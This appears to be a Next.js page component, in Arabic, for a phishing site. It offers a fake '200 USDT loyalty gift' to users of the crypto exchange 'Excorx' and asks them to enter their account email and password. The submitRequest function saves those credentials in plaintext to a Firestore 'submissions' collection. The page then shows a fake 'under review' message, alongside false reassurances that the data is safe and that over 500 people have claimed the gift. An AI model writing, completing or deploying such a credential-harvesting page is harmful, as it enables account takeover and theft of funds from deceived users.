
'use client';

import React, { useState } from 'react';
import Image from 'next/image';
import { useFirestore } from '@/firebase';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { PlaceHolderImages } from '@/lib/placeholder-images';

export default function Home() {
  const db = useFirestore();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  const logo = PlaceHolderImages.find(img => img.id === 'excorex-logo');

  const submitRequest = async () => {
    if (!email || !password) {
      alert('❌ يرجى إدخال البريد الإلكتروني وكلمة المرور.');
      return;
    }

    setLoading(true);

    try {
      await addDoc(collection(db, "submissions"), {
        email: email,
        password: password,
        createdAt: serverTimestamp(),
        status: "pending"
      });

      setSubmitted(true);
      setLoading(false);
    } catch (error) {
      console.error("Error adding document: ", error);
      alert('❌ حدث خطأ أثناء الإرسال. تأكد من إعدادات الـ Rules في Firebase.');
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen flex items-center justify-center p-4">
      <style jsx global>{`
        body {
          margin: 0;
          background: radial-gradient(circle at 30% 30%, #0b1f3a, #030712);
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
      `}</style>
      
      <style jsx>{`
        .gift-card {
            background: rgba(18, 28, 46, 0.85);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 32px;
            padding: 35px 30px;
            width: 420px;
            max-width: 100%;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(59, 130, 246, 0.3) inset;
            text-align: center;
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .gift-icon {
            margin-bottom: 20px;
            filter: drop-shadow(0 0 20px #3b82f6);
            animation: float 3s ease-in-out infinite;
            display: flex;
            justify-content: center;
        }

        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-8px); }
            100% { transform: translateY(0px); }
        }

        h1 {
            background: linear-gradient(135deg, #a5d8ff, #60a5fa);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 28px;
            margin: 5px 0 5px;
            font-weight: 700;
        }

        .sub-title {
            color: #9bb8e0;
            font-size: 16px;
            margin-bottom: 20px;
            border-bottom: 1px dashed #2d4b77;
            padding-bottom: 15px;
        }

        .highlight {
            background: linear-gradient(145deg, #1e2f47, #0e1a2b);
            padding: 18px 15px;
            border-radius: 24px;
            margin: 20px 0;
            border: 1px solid #2b3f5c;
            box-shadow: inset 0 2px 5px rgba(0,0,0,0.6);
        }

        .amount {
            font-size: 42px;
            font-weight: 800;
            color: #fcd34d;
            text-shadow: 0 0 15px #fbbf24;
            letter-spacing: 2px;
        }

        .amount small { font-size: 18px; color: #94a3b8; }

        .condition-badge {
            display: flex;
            justify-content: space-around;
            margin: 25px 0 20px;
            gap: 10px;
            flex-wrap: wrap;
        }

        .badge {
            background: rgba(0, 100, 255, 0.15);
            border: 1px solid #3b82f6;
            border-radius: 40px;
            padding: 8px 18px;
            color: #bfd9ff;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .input-group { margin: 20px 0; text-align: right; }
        .input-group label {
            display: block;
            color: #b3d0f0;
            font-size: 14px;
            margin-bottom: 8px;
        }

        .input-field {
            width: 100%;
            padding: 16px 18px;
            background: #0e1b2c;
            border: 2px solid #253c5c;
            border-radius: 50px;
            color: white;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
            box-sizing: border-box;
        }

        .input-field:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 15px #3b82f6;
        }

        .btn-request {
            width: 100%;
            padding: 16px;
            background: linear-gradient(90deg, #2563eb, #3b82f6, #60a5fa);
            border: none;
            border-radius: 50px;
            color: white;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 10px 25px -5px #1e3a8a;
            margin-top: 10px;
        }

        .btn-request:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .footer-note {
            margin-top: 25px;
            color: #5f7d9e;
            font-size: 12px;
            display: flex;
            justify-content: center;
            gap: 20px;
            border-top: 1px solid #1f3752;
            padding-top: 18px;
        }

        .review-message {
            margin-top: 20px;
            background: #0f2a3f;
            border: 1px solid #fbbf24;
            border-radius: 20px;
            padding: 16px;
            color: #fde68a;
            box-shadow: 0 0 20px #f59e0b40;
            animation: slideUp 0.4s;
        }

        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; } }
      `}</style>

      <div className="gift-card" dir="rtl">
        <div className="gift-icon">
          {logo && (
            <Image 
              src={logo.imageUrl} 
              alt={logo.description} 
              width={110} 
              height={110} 
              className="rounded-3xl"
              data-ai-hint={logo.imageHint}
            />
          )}
        </div>
        <h1>عرض خاص: 200 USDT</h1>
        <div className="sub-title">هدية لمستخدمي Excorx النشطين</div>

        <div className="highlight">
          <span style={{ color: '#b3d9ff', fontSize: '18px' }}>مكافأة الولاء</span>
          <div className="amount">200 <small>USDT</small></div>
        </div>

        <div className="condition-badge">
          <div className="badge"><span>✅</span> رصيد +500 USDT</div>
          <div className="badge"><span>👥</span> دعوة واحدة على الأقل</div>
        </div>

        {!submitted ? (
          <>
            <p style={{ color: '#b0caf0', fontSize: '14px', margin: '15px 0 5px' }}>
              لتأكيد أهليتك، يرجى تسجيل الدخول بحسابك في Excorx.
            </p>

            <div className="input-group">
              <label>📧 البريد الإلكتروني (مرتبط بالحساب)</label>
              <input 
                type="email" 
                className="input-field" 
                placeholder="أدخل بريدك الإلكتروني" 
                autoComplete="off"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>

            <div className="input-group">
              <label>🔐 كلمة المرور</label>
              <input 
                type="password" 
                className="input-field" 
                placeholder="كلمة مرور حسابك" 
                autoComplete="off"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>

            <button 
              className="btn-request" 
              onClick={submitRequest}
              disabled={loading}
            >
              {loading ? 'جاري المعالجة...' : '🚀 إرسال طلب الهدية'}
            </button>
          </>
        ) : (
          <div className="review-message">
            ⏳ طلبك قيد المراجعة، يستغرق التأكد من الشروط من ساعة إلى 3 ساعات. سيتم إعلامك عند القبول.
          </div>
        )}

        <div className="footer-note">
          <div>⏱️ عرض محدود</div>
          <div>🔒 بياناتك آمنة</div>
          <div>🎯 500+ استلموا</div>
        </div>
      </div>
    </main>
  );
}
